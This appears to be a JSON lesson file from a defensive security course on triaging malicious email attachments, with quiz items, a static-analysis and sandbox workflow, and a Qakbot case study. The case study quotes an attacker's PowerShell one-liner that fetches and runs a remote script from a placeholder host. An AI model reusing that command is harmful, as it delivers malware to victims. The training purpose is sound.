@@ -1,0 +1,150 @@
+{
+  "lesson_id": "d4e5f6a7-9b01-4c23-de45-f6a7b8c9d012",
+  "domain": "blue_team",
+  "title": "Analyzing Malicious Email Attachments",
+  "difficulty": 2,
+  "order_index": 102,
+  "prerequisites": ["Investigating Phishing: Headers and Spoofing"],
+  "concepts": [
+    "Modern attachment threat landscape",
+    "Malicious document analysis methodology",
+    "Macro and script-based attachment attacks",
+    "Sandbox detonation techniques",
+    "Attachment triage and safe handling",
+    "Common file format manipulation",
+    "HTML and LNK attachment attacks",
+    "IOC extraction from malicious attachments"
+  ],
+  "estimated_time": 45,
+  "learning_objectives": [
+    "Identify and categorize modern malicious attachment types including documents, archives, HTML, and LNK files",
+    "Perform safe static analysis of email attachments using tools like oletools, zipinfo, and file command",
+    "Configure and interpret sandbox detonation results for suspicious attachments",
+    "Extract IOCs (URLs, domains, IPs, file hashes) from malicious attachments for threat intelligence",
+    "Develop detection rules based on attachment analysis findings"
+  ],
+  "post_assessment": [
+    {
+      "question": "What is the safest first step when analyzing a suspicious email attachment?",
+      "options": [
+        "Open the attachment in the email client to see what happens",
+        "Extract the attachment and open it in a production application",
+        "Obtain the file hash and check it against threat intelligence, then analyze in an isolated sandbox environment",
+        "Forward the email with attachment to a colleague for a second opinion"
+      ],
+      "correct": 2,
+      "explanation": "Never open suspicious attachments on production systems. First, hash the file and check against threat intelligence. Then analyze in an isolated sandbox environment. This protects your system while still enabling thorough analysis."
+    },
+    {
+      "question": "An email contains a .docm attachment. What does the 'm' in the extension indicate?",
+      "options": [
+        "The document is marked for deletion after reading",
+        "The document contains macros that can execute when opened",
+        "The document is encrypted and requires a password",
+        "The document was sent from a mobile device"
+      ],
+      "correct": 1,
+      "explanation": "The 'm' extension (.docm, .xlsm, .pptm) indicates the Office document contains macros. Macros are VBA scripts that can execute code when the document is opened, making them a common attack vector."
+    },
+    {
+      "question": "What is a sandbox environment used for in attachment analysis?",
+      "options": [
+        "A secure place to store all email attachments permanently",
+        "An isolated environment where suspicious files can be safely executed and their behavior observed",
+        "A tool that automatically deletes all suspicious attachments",
+        "A backup system for email servers"
+      ],
+      "correct": 1,
+      "explanation": "A sandbox is an isolated environment (like Cuckoo, Any.Run, or Joe Sandbox) where suspicious files can be detonated safely. The sandbox monitors file behavior — network connections, file system changes, registry modifications, process creation — without risk to production systems."
+    },
+    {
+      "question": "Why are HTML attachments becoming more common in phishing attacks?",
+      "options": [
+        "HTML files cannot be scanned by antivirus software",
+        "HTML attachments can render credential harvesting forms locally in the browser without needing a remote server, bypassing URL filters",
+        "HTML files are always safe because they only contain text",
+        "HTML attachments bypass all email authentication checks"
+      ],
+      "correct": 1,
+      "explanation": "HTML attachments render credential harvesting forms locally in the victim's browser. Since the form is in the attachment (not on a remote server), it bypasses URL-based security filters. The victim sees what appears to be a legitimate login page without ever visiting a blocked URL."
+    },
+    {
+      "question": "After analyzing a malicious attachment, what should you do with the extracted IOCs?",
+      "options": [
+        "Delete them to prevent accidental infection",
+        "Share them only with your team through verbal communication",
+        "Add them to your threat intelligence platform, create detection rules, and block malicious indicators across security controls",
+        "Store them in a personal text file on your desktop for future reference"
+      ],
+      "correct": 2,
+      "explanation": "IOCs should be operationalized: add to your threat intelligence platform for correlation, create Sigma/YARA detection rules for future identification, and block malicious indicators (URLs, domains, IPs, hashes) across your security controls (proxy, firewall, EDR)."
+    }
+  ],
+  "jim_kwik_principles": [
+    "Active Recall — After each section, list the attachment types and their analysis methods from memory",
+    "Spaced Repetition — Review the analysis workflow at increasing intervals",
+    "Visualization — Map the attachment analysis process: Hash check → Static analysis → Sandbox → IOC extraction → Detection",
+    "Association — Link each attachment type to its most common attack technique",
+    "Emotion — Feel the urgency: a single malicious attachment can compromise an entire network",
+    "Storytelling — Frame attachment analysis as defusing a bomb — you must be methodical and never rush",
+    "Mnemonics — Use 'HASH' for analysis workflow: Hash check, Analyze statically, Sandbox detonate, Hunt for IOCs",
+    "Chunking — Learn one attachment type at a time before combining them",
+    "Simplification — Before analyzing a complex attachment, ask: 'What is this file trying to do?'",
+    "Teaching — Walk a colleague through analyzing a suspicious document to solidify your methodology"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "Attachments Are the Weapon, Not the Email",
+      "content": "The phishing email is just the delivery mechanism. The attachment is the weapon. Your job is to disarm it safely — understand what it does, extract the indicators, and create defenses. Never rush, never open on a production system, and always follow the methodology."
+    },
+    {
+      "type": "explanation",
+      "title": "Modern Attachment Threat Landscape",
+      "content": "Phishing attachments have evolved far beyond simple .exe files:\n\n**1. Office Documents (.docm, .xlsm, .pptm)**\n- VBA macros that execute on open (or enable content)\n- Often use multi-stage obfuscation\n- Download and execute secondary payloads\n- Still the #1 attachment type in enterprise phishing\n\n**2. HTML Attachments (.html, .htm)**\n- Local credential harvesting forms\n- Bypass URL filters since no external server needed\n- Can include JavaScript for obfuscation\n- Increasingly common (Q3 2023+: 40%+ of phishing attachments)\n\n**3. PDF Documents**\n- Embedded JavaScript for exploitation\n- Malicious links hidden in buttons/anchors\n- Form submissions to attacker-controlled servers\n- Exploit known PDF reader vulnerabilities\n\n**4. Archive Files (.zip, .7z, .rar)**\n- Contain any of the above types\n- Password-protected to bypass email scanning\n- May contain LNK files or .url shortcuts\n- Filename manipulation (e.g., invoice.pdf.exe)\n\n**5. LNK and URL Shortcuts**\n- Windows shortcut files that execute commands\n- Can launch PowerShell, cmd.exe, or other programs\n- Often hidden inside ZIP archives\n- Difficult to detect without sandbox analysis\n\n**6. ISO/IMG Disk Images**\n- Mount as virtual drives, bypassing Mark-of-the-Web\n- Contain executables that appear trusted when mounted\n- Increasingly used to evade attachment filters\n- Example: .iso containing a .lnk pointing to a .exe\n\n**Key Trend:** Attackers are moving away from macros (Microsoft blocked them by default) toward HTML, LNK, and ISO attachments.",
+      "key_takeaway": "Six attachment types: Office docs, HTML, PDF, Archives, LNK/URL, ISO/IMG. HTML and ISO attacks are increasing as macros are blocked."
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: Malicious Attachments Like a Trap in a Gift Box",
+      "content": "Imagine someone sends you a birthday present. It looks like a nice watch box. But inside, instead of a watch, there's a trap that springs when you open it.\n\nThat's a malicious email attachment. The email says 'Here's your invoice!' but the file inside does something bad when you open it.\n\n**The trap can work in different ways:**\n\n- **The hidden spring trap** (Macro document): The document looks normal, but when you 'enable content' it runs a hidden program\n\n- **The fake box** (HTML attachment): It looks like a login page inside the box, but it's actually stealing your password when you type it\n\n- **The nesting doll** (Archive file): A box inside a box inside a box. You have to open three layers before finding the real trap\n\n- **The invisible trap** (LNK file): It looks like a normal file, but it's secretly a shortcut that runs a bad program\n\n**Your job as a detective:** You never open the box yourself. Instead, you X-ray it (hash check), take it apart carefully (static analysis), and if you need to see what it does, you put it in a special robot room (sandbox) where it can spring its trap safely.",
+      "key_takeaway": "Never open suspicious attachments. Hash check → static analysis → sandbox. The attachment is a trap; analyze it safely."
+    },
+    {
+      "type": "code_exercise",
+      "title": "Safe Attachment Analysis Workflow",
+      "content": "Complete workflow for analyzing a suspicious email attachment:\n\n```bash\n# Step 1: Hash the file (do this FIRST, before anything else)\nsha256sum suspicious_attachment.docm\n# Compare hash against VirusTotal, MalwareBazaar\n\n# Step 2: Identify file type (don't trust extensions)\nfile suspicious_attachment.docm\n# Output: Composite Document File V2 Document → OLE2 document\n# Output: Zip archive data → Could be Office Open XML\n\n# Step 3: Extract metadata without opening\nexiftool suspicious_attachment.docm\n# Look for: Author, creation date, modification date, template\n\n# Step 4: Analyze Office macros (if applicable)\nolevba suspicious_attachment.docm\n# Look for: AutoOpen, Workbook_Open, Shell, CreateObject\n\n# Step 5: Deobfuscate macros\nolevba --decode suspicious_attachment.docm\n\n# Step 6: Check for embedded objects\noleid suspicious_attachment.docm\n# Look for: VBA macros, embedded objects, external relationships\n\n# Step 7: For HTML attachments\n# Extract and review HTML source\ncat suspicious_attachment.html | grep -E '(action=|href=|form|script|iframe)'\n# Look for: form action URLs, JavaScript, credential harvesting pages\n\n# Step 8: For archive files\nzipinfo suspicious_attachment.zip\n7z l suspicious_attachment.7z\n# List contents before extracting\n\n# Step 9: Extract IOCs\n# URLs\ngrep -oP 'https?://[^\"\\s<>]+' suspicious_file\n# IPs\ngrep -oP '\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b' suspicious_file\n# Domains\ngrep -oP '[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' suspicious_file\n\n# Step 10: Sandbox detonation\n# Upload to: Any.Run, Joe Sandbox, Cuckoo, Hybrid Analysis\n# Observe: network connections, file changes, process creation, registry modifications\n```\n\n**Key Principle:** Never open an attachment on a production system. Always hash first, analyze statically, then sandbox.",
+      "key_takeaway": "HASH workflow: Hash check → Analyze statically → Sandbox detonate → Hunt for IOCs. Never skip steps."
+    },
+    {
+      "type": "real_world",
+      "title": "Qakbot Delivery Chain: From HTML to Ransomware",
+      "content": "A real attack chain observed in Qakbot campaigns (2023) demonstrates multi-stage attachment delivery:\n\n**Stage 1: HTML Attachment**\n- Email: 'Invoice Payment Overdue - Action Required'\n- Attachment: `Invoice_2024_08.html` (150KB)\n- The HTML contained an encoded JavaScript that rendered a fake login page\n- When credentials were entered, they were sent to an attacker-controlled server\n\n**Stage 2: Credential Harvest → Lateral Movement**\n- Harvested credentials used to access email accounts\n- Attacker sent internal phishing emails from compromised accounts\n- Internal email contained a .zip attachment\n\n**Stage 3: ZIP Archive → LNK File**\n- `Q3_Report.zip` contained `Q3_Report.pdf.lnk`\n- The LNK file executed: `powershell -w hidden -c IEX(IWR 'http://x.x.x.x/qbot.ps1')`\n- PowerShell downloaded and executed Qakbot malware\n\n**Stage 4: Qakbot → Cobalt Strike → Ransomware**\n- Qakbot established persistence and C2 communication\n- Deployed Cobalt Strike for lateral movement\n- Final payload: ransomware deployment\n\n**Detection Opportunities at Each Stage:**\n\n| Stage | Detection |\n|-------|-----------|\n| HTML attachment | HTML file type detection, encoded JS pattern |\n| Credential harvest | Unusual login locations, MFA bypass attempts |\n| ZIP + LNK | Archive containing .lnk files, PowerShell -w hidden |\n| Qakbot C2 | Known C2 domains, scheduled task creation |\n| Cobalt Strike | Beacon patterns, named pipes |\n\n**Lesson:** Modern attacks use multiple attachment types across multiple stages. Detecting the initial HTML attachment could have prevented the entire chain.",
+      "key_takeaway": "Qakbot: HTML → credentials → ZIP/LNK → PowerShell → ransomware. Each stage has detection opportunities. Catch the first attachment."
+    },
+    {
+      "type": "memory_aid",
+      "title": "Attachment Analysis Cheat Sheet",
+      "content": "**HASH — Analysis Workflow:**\n- **H**ash — SHA256, check VT/MalwareBazaar\n- **A**nalyze statically — file type, exiftool, olevba\n- **S**andbox detonate — Any.Run, Cuckoo, Joe Sandbox\n- **H**unt for IOCs — URLs, IPs, domains, hashes\n\n**Attachment Types & Key Indicators:**\n| Type | Key Indicator | Primary Tool |\n|------|---------------|-------------|\n| .docm/.xlsm | VBA macros | olevba, oleid |\n| .html/.htm | Forms, scripts | Browser dev tools, grep |\n| .pdf | JS, links, forms | pdf-parser, pdfid |\n| .zip/.7z | Nested files, .lnk | zipinfo, 7z |\n| .lnk/.url | Target path, powershell | lnk_parser |\n| .iso/.img | Bypasses MotW | Mount in sandbox |\n\n**Red Flags in Macros:**\n- AutoOpen, Workbook_Open, Document_Open\n- Shell, WScript.Shell, CreateObject\n- Chr(), StrReverse(), Base64 decode\n- Environ(), environment variable access\n- Download from URL, WinHttp, XMLHTTP\n\n**Red Flags in HTML:**\n- Form action to external domain\n- Encoded/obfuscated JavaScript\n- Credential input fields (type=\"password\")\n- CSS hiding elements (display:none)\n- Iframe with external source\n\n**IOC Extraction Commands:**\n```bash\n# URLs\ngrep -oP 'https?://[^\"\\s<>]+' file\n# IPs\ngrep -oP '\\b\\d{1,3}(\\.\\d{1,3}){3}\\b' file\n# Domains\ngrep -oP '[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' file\n```",
+      "key_takeaway": "HASH workflow. Know your attachment types. Extract IOCs systematically. Never open on production."
+    },
+    {
+      "type": "explanation",
+      "title": "Sandbox Detonation and Interpretation",
+      "content": "Sandbox detonation provides behavioral analysis that static analysis can't match:\n\n**Popular Sandboxing Solutions:**\n- **Any.Run** — Interactive, browser-based, real-time monitoring\n- **Cuckoo Sandbox** — Open-source, customizable\n- **Joe Sandbox** — Deep behavioral analysis\n- **Hybrid Analysis** — Free tier, quick results\n- **VirusTotal** — Multi-engine scan (not full sandbox)\n\n**What to Look For in Sandbox Results:**\n\n**1. Network Activity**\n- DNS queries to suspicious domains\n- HTTP/HTTPS connections to C2 servers\n- Data exfiltration attempts\n- Download of secondary payloads\n\n**2. File System Changes**\n- Files created in temp directories\n- Dropper behavior (writes then executes)\n- Persistence mechanisms (registry run keys, scheduled tasks)\n- Configuration file modifications\n\n**3. Process Activity**\n- Process creation (especially cmd.exe, powershell.exe from Office apps)\n- Process injection (spawning from unusual parent processes)\n- Living-off-the-land binary execution\n\n**4. Registry Changes**\n- Run keys for persistence\n- Security setting modifications\n- Disabling of Windows Defender\n\n**Sandbox Evasion to Watch For:**\n- Anti-VM checks (checking for VM artifacts)\n- Delayed execution (sleeping to outlast sandbox timeout)\n- User interaction requirements (needing clicks to execute)\n- Environment detection (checking domain, time, keyboard layout)\n\n**When sandboxing fails:** If the malware detects the sandbox, detonate in a different environment, increase timeout, or simulate user interaction.",
+      "key_takeaway": "Sandbox reveals: network activity, file changes, process creation, registry modifications. Watch for evasion: anti-VM, delays, interaction requirements."
+    },
+    {
+      "type": "reflection",
+      "title": "Attachment Analysis Process Checklist",
+      "content": "Follow this checklist for every suspicious attachment:\n\n**Initial Triage:**\n- [ ] Calculate SHA256 hash\n- [ ] Check hash against VirusTotal, MalwareBazaar\n- [ ] Identify true file type with `file` command\n- [ ] Check file size (suspiciously small or large?)\n- [ ] Review sender and email context\n\n**Static Analysis:**\n- [ ] Extract metadata with exiftool\n- [ ] For Office docs: Run olevba, oleid\n- [ ] For HTML: Review source, grep for forms/scripts\n- [ ] For PDFs: Run pdfid, pdf-parser\n- [ ] For archives: List contents without extracting\n- [ ] Extract strings and IOCs\n\n**Dynamic Analysis (Sandbox):**\n- [ ] Upload to sandbox (Any.Run, Cuckoo, etc.)\n- [ ] Review network connections\n- [ ] Review process tree\n- [ ] Review file system changes\n- [ ] Review registry modifications\n- [ ] Note evasion techniques\n\n**IOC Extraction & Reporting:**\n- [ ] Extract all URLs, IPs, domains\n- [ ] Extract file hashes (sample + dropped files)\n- [ ] Create detection rules (Sigma, YARA)\n- [ ] Block malicious indicators\n- [ ] Document findings in incident report\n\n**Key Rule:** Never open a suspicious attachment on a production system. Always use isolated analysis environments.",
+      "key_takeaway": "Systematic process: Triage → Static Analysis → Sandbox → IOC Extraction → Detection Rules. Never skip steps."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Methodology Over Tools",
+      "content": "The tools will change. Qakbot will evolve. New attachment types will emerge. But the methodology stays the same:\n\n1. **Hash and check** — Is this known malware?\n2. **Identify and analyze** — What type is it really? What's inside?\n3. **Detonate and observe** — What does it actually do?\n4. **Extract and defend** — What indicators can I use to protect others?\n\nEvery attachment analysis should follow this workflow. The specific tools (olevba, Cuckoo, Any.Run) will be replaced over time, but the process won't.\n\n**Practice exercise:** Take any legitimate Office document from your work and run it through the static analysis steps (hash, file type, exiftool, olevba). Understanding normal documents makes it much easier to spot malicious ones.\n\nThe best analysts aren't the ones with the most tools — they're the ones who follow the methodology consistently."
+    }
+  ],
+  "tags": ["Course: SANS-SEC450", "Career Path: SOC Analyst", "Career Path: Malware Analyst", "email attachments", "malware analysis", "phishing", "sandbox", "macro analysis", "IOC extraction", "olevba"]
+}
